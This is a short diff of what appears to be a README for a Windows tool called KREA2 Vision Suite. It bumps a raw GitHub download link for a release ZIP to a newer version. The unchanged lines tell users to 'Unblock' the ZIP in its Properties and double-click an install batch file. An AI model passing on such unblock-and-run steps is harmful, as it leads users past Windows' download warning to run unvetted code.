@@ -33,7 +33,7 @@ The bootstrap downloads the complete stable release, verifies its exact byte len
 
 Manual alternative: download the complete ZIP below. Before extracting it, right-click the ZIP, select **Properties**, enable **Unblock**, and select **Apply**. Then extract it and double-click `START HERE - INSTALL.bat`.
 
-https://raw.githubusercontent.com/pixelgraple/KREA2-Vision-Suite/main/releases/Krea2VisionSuite-v0.13.17-win64.zip
+https://raw.githubusercontent.com/pixelgraple/KREA2-Vision-Suite/main/releases/Krea2VisionSuite-v0.13.18-win64.zip
 
 The installer will:
 
